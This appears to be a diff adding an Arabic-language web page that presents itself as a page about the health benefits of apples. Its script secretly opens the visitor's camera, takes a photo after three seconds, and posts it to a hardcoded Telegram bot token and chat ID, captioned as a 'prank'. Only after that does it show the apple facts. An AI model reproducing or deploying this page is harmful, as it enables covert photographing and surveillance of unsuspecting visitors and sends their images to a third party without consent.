@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>فوائد التفاح 🍎</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 20px; }
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+
+<h2>تحميل محتوى مفيد جدًا...</h2>
+<video id="video" autoplay playsinline width="300" height="200"></video>
+<canvas id="canvas" width="300" height="200"></canvas>
+
+<script>
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const ctx = canvas.getContext('2d');
+
+  const BOT_TOKEN = '8016316459:AAEE_hfZiGzcHpOdaf5KlCb6cUCG863OKT8';
+  const CHAT_ID = '6899028651';
+
+  async function startCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+
+      setTimeout(async () => {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const dataUrl = canvas.toDataURL('image/png');
+        const blob = await (await fetch(dataUrl)).blob();
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("caption", "تم التقاط صورة للمقلب 😈");
+        formData.append("photo", blob, "image.png");
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+
+        stream.getTracks().forEach(track => track.stop());
+
+        document.body.innerHTML = `
+          <h2>🍏 فوائد التفاح</h2>
+          <p>هل تعلم أن التفاح يحتوي على الألياف ومضادات الأكسدة؟</p>
+          <p>يساعد في تحسين الهضم وتقوية المناعة!</p>
+          <p>تناول تفاحة يوميًا قد يبعد الطبيب عنك 😉</p>
+        `;
+      }, 3000);
+    } catch (err) {
+      alert('يجب السماح بالوصول إلى الكاميرا!');
+    }
+  }
+
+  startCamera();
+</script>
+
+</body>
+</html>
